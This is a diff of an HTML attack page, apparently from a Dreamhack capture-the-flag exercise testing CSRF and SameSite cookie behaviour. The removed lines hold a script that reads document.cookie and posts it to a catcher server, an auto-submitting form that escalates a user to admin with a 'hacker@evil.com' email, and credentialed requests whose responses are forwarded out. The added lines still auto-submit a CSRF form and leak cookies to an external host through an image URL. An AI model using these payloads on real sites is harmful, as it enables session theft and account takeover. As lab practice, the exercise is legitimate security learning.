@@ -1,89 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Test Page</title>
+    <title>SameSite Test</title>
 </head>
 <body>
-    <h1>Security Assessment in Progress</h1>
+    <h2>Testing SameSite Vulnerability</h2>
     
-    <!-- Hidden image tracker -->
-    <img src="https://foqeblb.request.dreamhack.games/tracker.gif?page=exploit" style="display:none">
-    
-    <!-- Auto-submit form -->
-    <form id="stealForm" action="https://foqeblb.request.dreamhack.games/capture" method="POST">
-        <input type="hidden" name="action" value="steal_session">
-        <input type="hidden" name="referrer" value="https://foqeblb.request.dreamhack.games">
+    <!-- Test 1: Form POST -->
+    <form id="csrfForm" action="https://foqeblb.request.dreamhack.games/" method="POST">
+        <input type="hidden" name="action" value="test_csrf">
+        <input type="hidden" name="data" value="exploit_attempt">
     </form>
     
-    <!-- CSRF PoC -->
-    <form id="csrfForm" action="https://foqeblb.request.dreamhack.games/api/user/update" method="POST">
-        <input type="hidden" name="email" value="hacker@evil.com">
-        <input type="hidden" name="role" value="admin">
-    </form>
-    
+    <!-- Test 2: Auto Fetch -->
     <script>
-        // Capture cookies and send to our catcher
-        function captureCookies() {
-            const cookies = document.cookie;
-            const formData = new FormData();
-            formData.append('cookies', cookies);
-            formData.append('url', window.location.href);
-            
-            // Send to request catcher
-            fetch('https://your-server.com/catcher.php', {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
-            });
-        }
+        console.log("Starting SameSite test...");
         
-        // Auto-submit forms
+        // Test 1: Coba kirim request dengan credentials
         setTimeout(() => {
-            // Submit steal form
-            document.getElementById('stealForm').submit();
-            
-            // Try CSRF after delay
-            setTimeout(() => {
-                document.getElementById('csrfForm').submit();
-            }, 2000);
+            console.log("Test 1: Fetch with credentials");
+            fetch('https://foqeblb.request.dreamhack.games/', {
+                method: 'GET',
+                credentials: 'include',  // Ini yang penting!
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log("Fetch successful:", data.length);
+            })
+            .catch(err => {
+                console.log("Fetch error:", err);
+            });
         }, 1000);
         
-        // Make XHR requests
-        function makeXHRRequests() {
-            const endpoints = [
-                '/api/user',
-                '/api/session',
-                '/admin',
-                '/profile'
-            ];
-            
-            endpoints.forEach(endpoint => {
-                const xhr = new XMLHttpRequest();
-                xhr.open('GET', 'https://foqeblb.request.dreamhack.games' + endpoint, true);
-                xhr.withCredentials = true; // Include cookies
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState === 4) {
-                        // Send captured response to our server
-                        fetch('https://your-server.com/catcher.php', {
-                            method: 'POST',
-                            body: JSON.stringify({
-                                endpoint: endpoint,
-                                status: xhr.status,
-                                response: xhr.responseText
-                            }),
-                            mode: 'no-cors'
-                        });
-                    }
-                };
-                xhr.send();
-            });
-        }
+        // Test 2: Auto-submit form
+        setTimeout(() => {
+            console.log("Test 2: Form submission");
+            document.getElementById('csrfForm').submit();
+        }, 3000);
         
-        // Execute on page load
-        window.onload = function() {
-            captureCookies();
-            makeXHRRequests();
-        };
+        // Test 3: Image request
+        setTimeout(() => {
+            console.log("Test 3: Image request");
+            const img = new Image();
+            img.src = 'https://foqeblb.request.dreamhack.games/?test=image&cookie=' + document.cookie;
+        }, 5000);
     </script>
 </body>
 </html>
